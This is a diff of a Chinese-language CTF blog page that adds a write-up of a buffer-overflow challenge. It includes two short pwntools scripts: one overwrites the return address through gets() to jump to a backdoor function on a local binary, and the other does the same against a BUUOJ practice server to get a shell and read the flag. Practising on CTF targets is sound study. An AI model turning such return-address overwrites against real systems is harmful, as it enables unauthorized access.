@@ -35,8 +35,16 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040037377.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040040747.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040044935.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041038247.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041039256.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041059037.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041103930.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041104569.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041107149.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041108692.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041109119.png">
 <meta property="article:published_time" content="2024-12-03T16:02:19.000Z">
-<meta property="article:modified_time" content="2024-12-04T00:30:35.258Z">
+<meta property="article:modified_time" content="2024-12-04T03:10:20.264Z">
 <meta property="article:author" content="Nefelibata">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040012137.png">
@@ -232,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          136 字
+          274 字
         
       </span>
     
@@ -243,7 +251,7 @@
         
         
         
-          2 分钟
+          3 分钟
         
       </span>
     
@@ -316,6 +324,27 @@
 <p>gets函数存在溢出点；</p>
 <p>存在后门函数fun()</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040044935.png" srcset="/img/loading.gif" lazyload alt="image-20241204004451795"></p>
+<p>开始写exp：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041038247.png" srcset="/img/loading.gif" lazyload alt="image-20241204103850133">f5查看：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041039256.png" srcset="/img/loading.gif" lazyload alt="image-20241204103929137"></p>
+<p>发现可以连接，接着开始写payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000000401187</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041059037.png" srcset="/img/loading.gif" lazyload></p>
+<p>写payload时，苏要需找到s所占的字节数：（双击是，进入）</p>
+<p>同时本题涉及栈不平衡：需要更改fun（）函数的地址</p>
+<p>f5运行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041103930.png" srcset="/img/loading.gif" lazyload alt="image-20241204110359884"></p>
+<p>输入ls：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041104569.png" srcset="/img/loading.gif" lazyload alt="image-20241204110438507"></p>
+<p>成功后，别忘了更改为远端地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25496&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000000401187</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>运行：<img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041107149.png" srcset="/img/loading.gif" lazyload alt="image-20241204110747086"></p>
+<p>输入ls</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041108692.png" srcset="/img/loading.gif" lazyload alt="image-20241204110821632"></p>
+<p>输入cat flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041109119.png" srcset="/img/loading.gif" lazyload alt="image-20241204110915066"></p>
 
                 
               </div>
